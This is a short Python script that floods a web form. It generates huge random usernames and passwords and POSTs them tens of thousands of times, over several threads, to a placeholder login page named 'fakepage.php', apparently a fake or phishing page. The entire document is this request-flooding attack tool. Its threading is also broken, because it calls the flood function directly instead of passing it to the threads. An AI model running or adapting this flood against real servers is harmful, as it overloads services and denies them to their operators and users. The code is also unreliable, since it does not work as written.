
import requests , random , string 
import threading
thread = int(input(" Enter number of threads : ")) 
def randgenerator(size=6, chars=string.ascii_uppercase+string.digits) :
    return ''.join(random.choice(chars) for _ in range(size))

randSize = random.randint(100000,100000)
print(randgenerator(random.randrange(10),"6793YUIO"))
def flood():
    for i in range(60000):
        print("Request num : {} ".format(i))
        #generate random user & pass
        user = randgenerator(randSize)
        passw = randgenerator(randSize)
        data = {
        
            'name' : (None, '{}@gmail.com'.format(user)),
            'pass' : (None, passw),
        }
        
        resp = requests.post('http://example.com/fakepage.php',data=data)
          
threads = []
for i in range(thread) :
    thread1 = threading.Thread(target=flood(),args=(1,))
    thread1.start()
    threads.append(thread1)
for thread2 in threads : 
    thread2.join() 
